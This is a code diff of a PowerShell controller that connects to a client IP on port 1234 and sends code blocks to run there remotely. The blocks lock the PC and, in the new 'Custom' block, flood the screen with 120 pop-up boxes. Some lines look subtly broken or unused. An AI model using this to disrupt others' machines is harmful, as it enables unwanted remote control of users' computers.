@@ -2,12 +2,6 @@ function Show-Menu {
     Write-Host "1. Lock PC"
     Write-Host "2. Custom Function"
     Write-Host "3. Test Function"
-    Write-Host "4. Exit"
-}
-
-function Select-IPAddress {
-    $ipAddress = Read-Host "Enter the client's IP address: "
-    return $ipAddress
 }
 
 function Send-CodeToClient {
@@ -29,7 +23,29 @@ function Send-CodeToClient {
             Write-Host "PC Locked."
         }
         "Custom" = {
-            # Custom code goes here
+            Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class MessageBox
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+        public static extern int MessageBoxW(IntPtr hWnd, string text, string caption, uint type);
+    }
+"@
+
+$counter = 0
+$screenCount = [System.Windows.Forms.Screen]::AllScreens.Length
+
+while ($counter -lt 120) {
+    $x = Get-Random -Minimum 0 -Maximum ($screenCount * [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
+    $y = Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+
+    [MessageBox]::MessageBoxW(0, "???", "Random Pop-up", 0)
+
+    $counter++
+}
+
             Write-Host "Custom function executed."
         }
         "Test" = {
@@ -37,43 +53,39 @@ function Send-CodeToClient {
         }
     }
 
-    while ($true) {
-        Show-Menu
-        $selection = Read-Host "Select a function (1-4): "
+    Show-Menu
+    $selection = Read-Host "Select a function (1-3): "
 
-        # Validate the selection
-        if ($selection -eq 4) {
-            break  # Exit the loop and return to IP selection screen
-        }
-        elseif ($selection -lt 1 -or $selection -gt 3) {
-            Write-Host "Invalid selection."
-            continue  # Continue to next iteration of the loop
-        }
-
-        # Get the function name based on the selection
-        $functionName = @{
-            1 = "LockPC"
-            2 = "Custom"
-            3 = "Test"
-        }[[int]$selection]  # Cast $selection as an integer
-
-        # Select the appropriate function based on the provided FunctionName
-        if ($functions.ContainsKey($functionName)) {
-            $code = $functions[$functionName].ToString()
-        }
-        else {
-            Write-Host "Invalid FunctionName."
-            continue  # Continue to next iteration of the loop
-        }
-
-        $writer.WriteLine($code)
-        $writer.Flush()
+    # Validate the selection
+    if ($selection -lt 1 -or $selection -gt 3) {
+        Write-Host "Invalid selection."
+        return
     }
+
+    # Get the function name based on the selection
+    $functionName = @{
+        1 = "LockPC"
+        2 = "Custom"
+        3 = "Test"
+    }[[int]$selection]  # Cast $selection as an integer
+
+    # Select the appropriate function based on the provided FunctionName
+    if ($functions.ContainsKey($functionName)) {
+        $code = $functions[$functionName].ToString()
+    }
+    else {
+        Write-Host "Invalid FunctionName."
+        return
+    }
+
+    $writer.WriteLine($code)
+    $writer.Flush()
 
     $writer.Close()
     $stream.Close()
     $client.Close()
 }
 
-$ipAddress = Select-IPAddress
+
+$ipAddress = Read-Host "Enter the client's IP address: "
 Send-CodeToClient -IPAddress $ipAddress -Port 1234
